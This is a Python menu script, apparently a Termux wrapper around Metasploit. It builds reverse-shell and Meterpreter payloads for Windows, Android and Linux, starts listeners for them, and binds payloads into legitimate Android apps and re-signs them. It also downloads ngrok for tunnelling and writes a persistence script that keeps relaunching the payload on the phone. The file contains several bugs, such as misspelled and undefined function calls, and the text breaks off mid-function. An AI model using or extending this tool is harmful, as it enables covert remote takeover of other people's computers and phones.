#!/usr/bin/env python
#coding: utf-8
#AUTHOR : DEVIL MASTER
#GITHUB - https://github.com/isuruwa

import os, sys, time
from requests import get
from time import sleep

class colors:
    whit = '\033[37m'
    end = '\033[0m' # end
    red = '\033[31m' # red
    green = '\033[1;32m' # green
    orange = '\033[33m' # orange
    blue = '\033[34m' # blue
    purple = '\033[35m' # purple
    white = "\x1b[97m" #end white
    redf = '\033[41m'#redf
    yellow = '\033[93m' #yellow


def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(2/800)

def slowprint2(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(2/100)

def start():
  os.system('clear')
  os.system('bash banner.sh')

def pubip():
  print("\n")
  ip = get('https://api.ipify.org').text
  slowprint(colors.whit + "[IP] Your Public Ip is : "+ colors.purple + ip)
  print("\n")

def ngrokins():
  start()
  if os.path.isfile('/data/data/com.termux/files/home/ngrok'):
    slowprint2(colors.green + "[+] NGROK ALREADY FOUND")
    time.sleep(2)
    menu()
  else:
    try:
      print(str(colors.green + "[*] Architecture Type ⬇️ " ))
      os.system('dpkg --print-architecture')
      ngr = input("\033[37m[+] Enter Above Displayed Architecture Type ( Default = arm ) : ")
      if ngr == "aarch64":
        os.system('wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip')
        os.system('unzip ngrok-stable-linux-arm64.zip')
        os.system('chmod 777 ngrok')
        slowprint2(colors.green + "[+] Done [+]")
        time.sleep(2)
        menu()
      elif ngr == "amd64":
        os.system('wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip')
        os.system('unzip ngrok-stable-linux-amd64.zip')
        os.system('chmod 777 ngrok')
        menu()    
      elif ngr == "arm":
        os.system('wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip')
        os.system('unzip ngrok-stable-linux-arm.zip')
        os.system('chmod 777 ngrok')
        menu()      
      elif ngr == "armhf":
        os.system('wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip')
        os.system('unzip ngrok-stable-linux-arm.zip')
        os.system('chmod 777 ngrok')
        menu() 
      elif ngr == "":
        os.system('wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip')
        os.system('unzip ngrok-stable-linux-arm.zip')
        os.system('chmod 777 ngrok')
        os.system('chmod 777 ngrok')
      else:
        slowprint2(colors.red + "[!] Architecture Not Found ")
        time.sleep(2)
        menu()
    except:
      slopwprint2(colors.red + "[!] System Error")
      time.sleep(2)
      menu()

def bind():
  start()
  slowprint2("\033[37m[\033[31m1\033[37m]  Install APKMOD")
  slowprint2("\033[37m[\033[31m2\033[37m]  Bind APK\n")
  slowprint2("\033[37m[\033[31m00\033[37m] Back\n")
  uchoice = str(input("\033[37m[\033[31m+\033[37m] \033[1;32mMSF > "))
  if uchoice == "1":
    start()
    msfbind = input(colors.green + " [+] Are you sure to Install Metasploit ? <y/n> ")
    if msfbind == "y" or msfbind == "Y" or msfbind == "yes" or msfbind == "YES" or msfbind == "Yes":
      os.system('cd $HOME')
      os.system('wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh')
      os.system('sh setup.sh')
      menu()
    else:
      menu()
  elif uchoice == "2":
    start()
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    orgapk = str(input("\033[37m[+] Path To Original APK : "))
    bindapk = str(input("\033[37m[+] Path To  Binded  Apk : "))
    try:
      os.system("apkmod -a -b {0} -o {1} LHOST={2} LPORT={3}".format(orgapk,bindapk,host,port))
    except:
      slowprint2("\033[37m[\033[31m!\033[37m] PAYLOAD BINDING FAILED")
      sleep.time(3)
      menu()
  elif uchoice == "3":
    menu()
  else:
    menu()

def signapk():
  start()
  if os.system("which apkmod >/dev/null 2>&1") == 0:
    unsignapk = str(input("\033[37m[+] Path To Unsigned APK : "))
    signapk = str(input("\033[37m[+] Path To Signed APK : "))
    try:
      os.system("apkmod -s {0} -o {1}".format(unsignapk,signapk))
    except:
      slowprint2("\033[37m[\033[31m!\033[37m] APK SIGN FAILED ...")
  else:
    slowprint2("\033[37m[\033[31m!\033[37m] APKMOD not installed")
    apkmodins = str(input("Jump To Apkmod Installtion (y/n) ? : "))
    if apkmodins == "y" or apkmodins == "Y" or apkmodins == "yes" or apkmodins == "YES" or apkmodins == "Yes":
      apkmodins()
    else:
      menu()

def persistence():
    start()
    if os.path.isfile('inject.sh'):
        slowprint2("\033[37m[\033[31m+\033[37m] Script Already Found As inject.sh")
        time.sleep(3)
        menu()
    else:
        with open('inject.sh', 'a') as f:
            f.write("#!/bin/bash" + '\n' + "while :" + '\n' + "do am start --user o -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity" + '\n' + "sleep 20" + '\n' + "done")
            f.close()
            print("")
            print("\033[37m[\033[31m+\033[37m] Script Saved as inject.sh ")
            time.sleep(5)
        menu()

def menu():
  start()
  slowprint2("\n\033[37m [\033[35m1\033[37m] Install Metasploit")
  slowprint2("\033[37m [\033[35m2\033[37m] Create Payload")
  slowprint2("\033[37m [\033[35m3\033[37m] Start Listner")
  slowprint2("\033[37m [\033[35m4\033[37m] Payload Bind")
  slowprint2("\033[37m [\033[35m5\033[37m] Download Ngrok")
  slowprint2("\033[37m [\033[35m6\033[37m] Sign Apk")
  slowprint2("\033[37m [\033[35m7\033[37m] Android persistence\n")
  uchoice = str(input("\033[37m [\033[31m+\033[37m] \033[35mMSF > "))
  if uchoice == "1":
    msfinstall()
  elif uchoice == "2":
    crpay()
  elif uchoice == "3":
    lis()
  elif uchoice == "4":
    bind()
  elif uchoice == "5":
    ngrokins()
  elif uchoice == "6":
    signapk()
  elif uchoice == "7":
    persistence()
  else:
    menu()

def lis():
  start()
  slowprint2("\033[37m[\033[31m+\033[37m] Listner Menu \033[37m[\033[31m+\033[37m]")
  slowprint(colors.green + """
PAYLOADS AVAIBLE :

[1]  Windows
[2]  Android
[3]  Linux

[00] Back

""")

  lispay = str(input("\033[37m[\033[31m+\033[37m] Payload > "))
  if lispay == "1":
    liswin()
  if lispay == "2":
    lisandro()
  if lispay == "3":
    lislinux()
  else:
    menu() 

def liswin():
  start()
  pubip()
  slowprint(colors.green + """
[1]  windows/shell/reverse_tcp
[2]  windows/meterpreter/reverse_http
[3]  windows/meterpreter/reverse_https
[4]  windows/meterpreter/reverse_tcp
[5]  windows/meterpreter_reverse_http
[6]  windows/meterpreter_reverse_https
[7]  windows/meterpreter_reverse_tcp

[00] Back

""")
  win = str(input("\033[37m[\033[31m+\033[37m] Win > "))
  if win == "1":
    pubip()
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    winpay = "windows/shell/reverse_tcp"
    os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,winpay))
    menu()

  if win == "2":
    pubip()
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    winpay = "windows/meterpreter/reverse_http"
    os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,winpay))
    menu()

  if win == "3":
    pubip()
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    winpay = "windows/meterpreter/reverse_https"
    os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,winpay))
    menu()

  if win == "4":
    pubip()
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    winpay = "windows/meterpreter/reverse_tcp"
    os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,winpay))
    menu()

  if win == "5":
    pubip()
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    winpay = "windows/meterpreter_reverse_http"
    os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,winpay))
    menu()

  if win == "6":
    pubip()
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    winpay = "windows/meterpreter_reverse_https"
    os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,winpay))
    menu()

  if win == "7":
    pubip()
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    winpay = "windows/meterpreter_reverse_tcp"
    os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,winpay))
    menu()

  elif win == "00" : 
    menu()
  else:
    menu()

def lisandro():
    start()
    pubip()
    slowprint(colors.green + """
[1]  android/shell/reverse_http
[2]  android/shell/reverse_https
[3]  android/shell/reverse_tcp
[4]  android/meterpreter/reverse_http
[5]  android/meterpreter/reverse_https
[6]  android/meterpreter/reverse_tcp
[7]  android/meterpreter_reverse_http
[8]  android/meterpreter_reverse_https
[9]  android/meterpreter_reverse_tcp
[00] Back
""")
    andro = str(input("\033[37m[\033[31m+\033[37m] Android > "))
    if andro == "1":
      host = str(input("\033[37m[+] LHOST : "))
      port = str(input("\033[37m[+] LPORT : "))
      andro = "android/shell/reverse_http"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,andro))
      menu()
    elif andro == "2":
      host = str(input("\033[37m[+] LHOST : "))
      port = str(input("\033[37m[+] LPORT : "))
      andro = "android/shell/reverse_https"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,andro))
      menu()
    elif andro == "3":
      host = str(input("\033[37m[+] LHOST : "))
      port = str(input("\033[37m[+] LPORT : "))
      andro = "android/shell/reverse_tcp"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,andro))
      menu()
    elif andro == "5":
      host = str(input("\033[37m[+] LHOST : "))
      port = str(input("\033[37m[+] LPORT : "))
      andro = "android/meterpreter/reverse_https"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,andro))
      menu()
    elif andro == "6":
      host = str(input("\033[37m[+] LHOST : "))
      port = str(input("\033[37m[+] LPORT : "))
      andro = "android/meterpreter/reverse_tcp"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,andro))
      menu()
    elif andro == "7":
      host = str(input("\033[37m[+] LHOST : "))
      port = str(input("\033[37m[+] LPORT : "))
      andro = "android/meterpreter_reverse_http"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,andro))
      menu()
    elif andro == "8":
      host = str(input("\033[37m[+] LHOST : "))
      port = str(input("\033[37m[+] LPORT : "))
      andro = "android/meterpreter_reverse_https"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,andro))
      menu()
    elif andro == "9":
      host = str(input("\033[37m[+] LHOST : "))
      port = str(input("\033[37m[+] LPORT : "))
      andro = "android/meterpreter_reverse_tcp"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,andro))
      menu()
    elif andro == "00":
      menu()
    else:
      menu()

def lislinux():
  start()
  pubip()
  slowprint(colors.green + """
[1]  linux/x86/shell/reverse_tcp
[2]  linux/x86/meterpreter_reverse_http
[3]  linux/x86/meterpreter_reverse_https
[4]  linux/x86/meterpreter_reverse_tcp
[5]  linux/x64/shell/reverse_tcp
[6]  linux/x64/meterpreter_reverse_http
[7]  linux/x64/meterpreter_reverse_https
[8]  linux/x64/meterpreter_reverse_tcp
[00] Back
""")
  linx = str(input("\033[37m[\033[31m+\033[37m] Linux > "))
  if linx == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    linuxpay = "linux/x86/shell/reverse_tcp"
    os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,linuxpay))
    menu()
  elif linx == "2":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    linuxpay = "linux/x86/meterpreter_reverse_http"
    os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,linuxpay))
    menu()
  elif linx == "3":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    linuxpay = "linux/x86/meterpreter_reverse_https"
    os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,linuxpay))
    menu()
  elif linx == "4":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    linuxpay = "linux/x86/meterpreter_reverse_tcp"
    os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,linuxpay))
    menu()
  elif linx == "5":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    linuxpay = "linux/x64/shell/reverse_tcp"
    os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,linuxpay))
    menu()
  elif linx == "6":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    linuxpay = "linux/x64/meterpreter_reverse_http"
    os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,linuxpay))
    menu()
  elif linx == "7":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    linuxpay = "linux/x64/meterpreter_reverse_https"
    os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,linuxpay))
    menu()
  elif linx == "8":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    linuxpay = "linux/x64/meterpreter_reverse_tcp"
    os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,linuxpay))
    menu()
  elif linx == "00":
    menu()
  else:
    menu()



def crpay():
  start()
  slowprint2("\033[37m[\033[31m+\033[37m] Create Payload Menu \033[37m[\033[31m+\033[37m]")
  slowprint(colors.green + """
PAYLOADS AVAIBLE :

[1]  Windows
[2]  Android
[3]  Linux

[00] Back

""")

  pay = str(input("\033[37m[\033[31m+\033[37m] Payload > "))
  if pay == "1":
    crwin()
  if pay == "2":
    crandro()
  if pay == "3":
    crlinux()
  else:
    menu()

def crwin():
  start()
  pubip()
  slowprint(colors.green + """
[1]  windows/shell/reverse_tcp
[2]  windows/meterpreter/reverse_http
[3]  windows/meterpreter/reverse_https
[4]  windows/meterpreter/reverse_tcp
[5]  windows/meterpreter_reverse_http
[6]  windows/meterpreter_reverse_https
[7]  windows/meterpreter_reverse_tcp

[00] Back

""")
  win = str(input("\033[37m[\033[31m+\033[37m] Win > "))
  if win == "1":
    pubip()
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################")
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform windows -p windows/shell/reverse_tcp LHOST={0} LPORT={1} -f exe -o {2}.exe".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################## Done ##########################")
    print("\n")
    winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
      pay = "windows/shell/reverse_tcp"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      slowprint2(colors.green + "################## Starting Listner ####################")
      print("\n")
      slowprint2(colors.red   + "################# Starting Listner Failed ###############")
      time.sleep(2)
      menu()

  if win == "2":
    pubip()
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################")
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform windows -p windows/meterpreter/reverse_http LHOST={0} LPORT={1} -f exe -o {2}.exe".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################## Done ##########################")
    print("\n")
    winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
      pay = "windows/meterpreter/reverse_http"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      slowprint2(colors.green + "################## Starting Listner ####################")
      print("\n")
      slowprint2(colors.red   + "################# Starting Listner Failed ###############")
      time.sleep(2)
      menu()

  if win == "3":
    pubip()
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################")
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform windows -p windows/meterpreter/reverse_https LHOST={0} LPORT={1} -f exe -o {2}.exe".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################## Done ##########################")
    print("\n")
    winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
      pay = "windows/meterpreter/reverse_https"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      slowprint2(colors.green + "################## Starting Listner ####################")
      print("\n")
      slowprint2(colors.red   + "################# Starting Listner Failed ###############")
      time.sleep(2)
      menu()

  if win == "4":
    pubip()
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################")
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe -o {2}.exe".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################## Done ##########################")
    print("\n")
    winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
      pay = "windows/meterpreter/reverse_tcp"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      slowprint2(colors.green + "################## Starting Listner ####################")
      print("\n")
      slowprint2(colors.red   + "################# Starting Listner Failed ###############")
      time.sleep(2)
      menu()

  if win == "5":
    pubip()
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################")
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform windows -p windows/meterpreter_reverse_http LHOST={0} LPORT={1} -f exe -o {2}.exe".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################## Done ##########################")
    print("\n")
    winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
      pay = "windows/meterpreter_reverse_http"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      slowprint2(colors.green + "################## Starting Listner ####################")
      print("\n")
      slowprint2(colors.red   + "################# Starting Listner Failed ###############")
      time.sleep(2)
      menu()

  if win == "6":
    pubip()
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################")
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform windows -p windows/meterpreter_reverse_https LHOST={0} LPORT={1} -f exe -o {2}.exe".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################## Done ##########################")
    print("\n")
    winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
      pay = "windows/meterpreter_reverse_https"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      slowprint2(colors.green + "################## Starting Listner ####################")
      print("\n")
      slowprint2(colors.red   + "################# Starting Listner Failed ###############")
      time.sleep(2)
      menu()

  if win == "7":
    pubip()
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################")
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform windows -p windows/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f exe -o {2}.exe".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################## Done ##########################")
    print("\n")
    winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
      pay = "windows/meterpreter_reverse_tcp"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      slowprint2(colors.green + "################## Starting Listner ####################")
      print("\n")
      slowprint2(colors.red   + "################# Starting Listner Failed ###############")
      time.sleep(2)
      menu()

  else:
    time.sleep(2)
    menu()


def crandro():
  start()
  pubip()
  slowprint(colors.green + """ 
[1]  android/shell/reverse_http
[2]  android/shell/reverse_https
[3]  android/shell/reverse_tcp
[4]  android/meterpreter/reverse_http
[5]  android/meterpreter/reverse_https
[6]  android/meterpreter/reverse_tcp
[7]  android/meterpreter_reverse_http
[8]  android/meterpreter_reverse_https
[9]  android/meterpreter_reverse_tcp

[00] Back

""")
  crandroget = str(input("\033[37m[\033[31m+\033[37m] Android > "))
  if crandroget == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################") 
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform android -p android/shell/reverse_http LHOST={0} LPORT={1} -o {2}.apk".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################## Done ##########################")
    print("\n")
    androlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if androlis == "Yes" or androlis == "yes" or androlis == "y" or androlis == "Y":
      print("\n")
      slowprint2(colors.green + "################## Starting Listner ####################")
      pay = "android/shell/reverse_http"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red   + "################# Starting Listner Failed ###############")
      menu()

  if crandroget == "2":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################")  
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform android -p android/shell/reverse_https LHOST={0} LPORT={1} -o {2}.apk".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################## Done ##########################")
    print("\n")
    androlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if androlis == "Yes" or androlis == "yes" or androlis == "y" or androlis == "Y":
      print("\n")
      slowprint2(colors.green + "################## Starting Listner ####################")
      pay = "android/shell/reverse_https"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red   + "################# Starting Listner Failed ###############")
      menu()

  if crandroget == "3":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################") 
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform android -p android/shell/reverse_tcp LHOST={0} LPORT={1} -o {2}.apk".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################## Done ##########################")
    print("\n")
    androlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if androlis == "Yes" or androlis == "yes" or androlis == "y" or androlis == "Y":
      print("\n")
      slowprint2(colors.green + "################## Starting Listner ####################")
      pay = "android/shell/reverse_tcp"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red   + "################ Starting Listner Failed ################")
      menu()


  if crandroget == "4":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################") 
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform android -p android/meterpreter/reverse_http LHOST={0} LPORT={1} -o {2}.apk".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################### Done #########################")
    print("\n")
    androlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if androlis == "Yes" or androlis == "yes" or androlis == "y" or androlis == "Y":
      print("\n")
      slowprint2(colors.green + "################## Starting Listner ####################")
      pay = "android/meterpreter/reverse_http"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red   + "################ Starting Listner Failed ################")
      menu()



  if crandroget == "5":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################")  
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform android -p android/meterpreter/reverse_https LHOST={0} LPORT={1} -o {2}.apk".format(host,port,outp))
    print("\n")
    slowprint2(colors.red     + "############## Payload Generating Success ##############")
    print("\n")
    slowprint2(colors.green   + "######################### Done #########################")
    print("\n")
    androlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if androlis == "Yes" or androlis == "yes" or androlis == "y" or androlis == "Y":
      print("\n")
      slowprint2(colors.green + "################## Starting Listner ####################")
      pay = "android/meterpreter/reverse_https"
      os.system("msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red   + "################ Starting Listner Failed ################")
      menu()



  if crandroget == "6":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red     + "####################### Starting #######################") 
    print("\n")
    slowprint2(colors.red     + "################## Generating Payload ##################")
    print("\n")
    os.system("msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o {2}.apk".format(host,port,outp))
